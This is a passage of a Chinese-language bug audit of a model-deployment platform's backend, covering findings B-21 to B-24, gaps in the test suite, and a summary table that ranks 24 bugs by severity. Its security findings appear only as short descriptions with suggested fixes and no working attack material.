- 实际：catalog 的 id 是 base id（\`qwen3-8b\`），\`VARIANT_MEMORY\` 的键是变体 id（\`qwen3-8b-bf16\`），两者不相交；默认 \`PlanRequest.model_id="qwen3-8b-bf16"\` 永远走 \`VARIANT_MEMORY\` 的粗估分支，\`decision.variant\` 变成 \`"custom"\`。请求不存在的量化（如 \`quantization:"nonexistent"\`）也会被静默忽略、退回 fallback 分支。
- 影响：planner 对预置变体走的是硬编码内存估算，而不是 catalog 的物理 profile；两套数据（\`catalog/models.yaml\` 与 \`VARIANT_MEMORY\`）有漂移风险。

### B-22 \`deployments.start\` 的 transformers 分支可能永久阻塞且失败后遗留孤儿进程

- 严重程度：**一般**（代码审查怀疑，未复现，避免真的加载模型）
- 位置：\`backend/app/services/deployments.py:104-134\`
- 复现（代码审查）：循环 \`for i in range(60): line = proc.stdout.readline(); ...\`。\`readline()\` 在子进程存活但不输出时阻塞，健康检查只在读到一行后才执行；因此「60 次」并不是时间上限。子进程若启动后长时间不打印，\`POST /start\` 会一直挂起。\`else: dep["status"]="FAILED"\` 分支也不 \`proc.kill()\`。
- 期望：用带总超时的循环（\`proc.stdout.readline\` 放到线程/select 中，或 \`proc.wait(timeout)\` + 轮询 health），超时后 \`proc.kill()\`。
- 实际：无总体超时；失败/超时后进程可能继续存活，占用内存与端口。
- 影响：启动一个加载慢或卡住的模型会让 HTTP 请求长时间不返回，且留下孤儿进程，后续 \`stop\` 只杀 \`dep["pid"]\`（此时可能已设置但进程状态未知）。因会真实加载模型，本次未做端到端复现。

### B-23 \`environment.scan\` 对畸形 nvidia-smi 输出未做数值校验

- 严重程度：**存疑**
- 位置：\`backend/app/services/environment.py:21\`（\`int(float(parts[1]))\`）
- 复现（代码审查）：只要 \`nvidia-smi\` 行按逗号切出 >=4 段但第 2/3 段不是数字，\`int(float(...))\` 抛 \`ValueError\` 且无捕获，\`GET /api/environment/latest\` 返回 500。
- 期望：与 \`hardware._nvidia_devices\` 一样用 try/except 跳过坏行。
- 实际：\`hardware.py:82-89\` 有 \`try/except ValueError\`，\`environment.py\` 没有。本机 macOS 无 nvidia-smi，未复现。
- 影响：在 nvidia-smi 输出异常（驱动版本变化、CUDA 警告混入）的机器上，环境接口 500。

### B-24 未使用的配置：\`catalog/models.yaml\` 与 \`catalog/compatibility.yaml\` 无任何代码引用

- 严重程度：**轻微**
- 位置：\`catalog/models.yaml\`、\`catalog/compatibility.yaml\`
- 复现：

\`\`\`bash
grep -rn "models.yaml\|compatibility.yaml" \
  /Users/supre/Documents/tmp/model-deploy-platform/backend/app \
  /Users/supre/Documents/tmp/model-deploy-platform/desktop/server.js \
  /Users/supre/Documents/tmp/model-deploy-platform/frontend/index.html
# 无输出
\`\`\`

- 期望：要么被加载，要么删除，避免与代码中的 \`CATALOG\`/\`VARIANT_MEMORY\` 形成漂移。
- 实际：catalog 硬编码在 \`catalog.py:230-256\`，planner 内存常量硬编码在 \`planner.py:21-24\`；两个 yaml 是死配置。
- 影响：维护者可能误以为改 yaml 生效；实际不会。

---

## 四、现有测试盲区

运行 \`cd backend && .venv/bin/python -m pytest --collect-only -q\` 共 31 项。覆盖到的：catalog 不变量、resolver 的 zero_spill 推荐、UMA MoE 偏好、speed gate、backend 不兼容行、plan 命令 argv、bitsandbytes 阻断、profile 钳制/UMA headroom/离散 margin、profile code 往返与「改 digest」、recommend 用客户端档案、planner 用客户端档案、部署 service 层缺失 id 抛异常、ollama 端口改写、transformers 保留端口、列表。

完全没覆盖、且本次实际出问题的路径：

1. **HTTP 层错误映射**：没有任何 TestClient/httpx 级别的路由测试；\`deployments.health/start/stop/test\` 对不存在 id 的 500、\`get\` 返回 200 \`{}\` 无人测（B-09）。
2. **输入类型/数值健壮性**：\`gpus\` 非列表（B-06）、非有限浮点（B-05）、\`available_vram_gb\` 钳制与自洽（B-07）、port 范围（B-10）全无测试。
3. **planner 命令安全**：\`command_string\` 无测试；现有 \`test_plan_command_is_argument_list\` 只断言 argv（B-03）。
4. **plan_window 上界**：现有断言只有 \`>= 65536\`，没有「<= native_ctx」，因此 \`native=32768\` 时返回 65536 不会被发现（B-08）。
5. **并发/唯一性**：部署 ID 唯一性无测试（B-02）。
6. **remote 权限**：只测了 \`create_deployment\` 的 403，未测 start/stop/test/health 的权限（B-04）。
7. **CORS/信任边界**：无跨源测试（B-01）。
8. **GPU 表**：只测了 M4 Pro 和几个 NVIDIA 命中，未测 \`Apple GPU\` 死键、Apple M5、\`RTX 40900\` 子串误匹配（B-11）。
9. **档案码完整性**：只测「改 digest 会失败」，未测「重算 digest 可通过」，因此文档的安全承诺未被证伪（B-14）。
10. **spill-visible 分支**：\`test_spill_models_stay_visible...\` 用 ram=0 的 budget，只触达 physics-refused/backend-incompatible，从未触达 spill-visible（B-15）。
11. **健康语义**：没有针对 STOPPED/FAILED 部署的 health 断言（B-13）。
12. **runtimes**：\`transformers_server.py\` 的流式契约、\`ollama_runtime.start_model\` 忽略 status_code、\`environment.scan\` 畸形输入均无测试（B-20/B-23）。

---

## 五、汇总表（按严重程度排序）

| 编号 | 标题 | 严重程度 | 类别 | 位置 |
|---|---|---|---|---|
| B-01 | CORS \`*\` + 回环信任导致任意网页可 drive-by 创建/启动部署 | 严重 | 安全 | main.py:20-25,67-69 |
| B-02 | 部署 ID 秒级时间戳，同秒创建互相覆盖 | 严重 | 数据一致性 | deployments.py:46 |
| B-03 | planner \`command_string\` 未转义，model_path 可注入命令 | 严重 | 安全 | planner.py:129-161 |
| B-04 | remote 403 只保护创建，start/stop/test/health/list 无校验 | 严重 | 安全 | main.py:212-239 |
| B-05 | 非有限浮点 available_vram_gb 触发 500 | 一般 | 健壮性 | models.py:134-137 |
| B-06 | 客户端档案 gpus 非列表触发 500 | 一般 | 健壮性 | hardware.py:233 |
| B-07 | available_vram_gb 未钳制，UMA 下 usable>total、可负 | 一般 | 数值边界 | models.py:134-137 |
| B-08 | plan_window 返回大于 native_ctx 的窗口 | 一般 | 数值边界 | estimator.py:121-138 |
| B-09 | 缺失部署 id：GET 200 \`{}\` vs 其余 500 | 一般 | API 契约 | deployments.py:169-194 |
| B-10 | port 无范围校验（0/负数/70000/超大） | 一般 | 输入校验 | main.py:193; planner.py:31 |
| B-11 | GPU 表缺 Apple M5；\`apple gpu\` 死键；\`RTX 40900\` 误匹配 | 一般 | 功能 | gpu_table.py:14-127 |
| B-12 | Host 头驱动 health_endpoint，/health 发起 SSRF | 一般 | 安全 | main.py:72-75; deployments.py:74,175-187 |
| B-13 | STOPPED/FAILED 部署 health 仍报 healthy=true | 一般 | 功能/可观测 | deployments.py:74,175-187 |
| B-14 | 档案码校验和可重算，非防篡改签名 | 一般 | 安全/文档 | profiles.py:15-40 |
| B-16 | 错误响应格式不统一（JSON detail vs 500 text/plain） | 一般 | API 契约 | main.py（全局） |
| B-22 | deployments.start transformers 分支可能永久阻塞/孤儿进程 | 一般 | 并发/资源（代码审查） | deployments.py:104-134 |
| B-15 | spill-visible 在客户端/UMA 档案下不可达 | 存疑 | 设计一致性 | estimator.py:99-113; catalog.py:151-160 |
| B-23 | environment.scan 畸形 nvidia-smi 输出未捕获 ValueError | 存疑 | 健壮性（代码审查） | environment.py:21 |
| B-17 | \`_public_host\` IPv6 Host 解析错误 | 轻微 | 功能 | main.py:72-75 |
| B-18 | \`_detect_backends\` 用 importlib.util 但未显式导入 | 轻微 | 潜在缺陷 | deployments.py:8-40 |
| B-19 | plan_window floor<=1 死循环（内部不可达） | 轻微 | 潜在缺陷 | estimator.py:132-137 |
| B-20 | transformers_server stream=true 返回非 SSE | 轻微 | 契约 | transformers_server.py:66-74 |
| B-21 | planner VARIANT_MEMORY 变体 id 与 catalog base id 错位 | 轻微 | 设计/维护 | planner.py:21-47 |
| B-24 | catalog/*.yaml 为无引用死配置 | 轻微 | 维护 | catalog/models.yaml, catalog/compatibility.yaml |

统计：**24 条** = 严重 4 + 一般 12 + 轻微 6 + 存疑 2。
其中「确认的 bug」22 条（含通过接口或单元复现），「代码审查怀疑」2 条（B-22、B-23）。
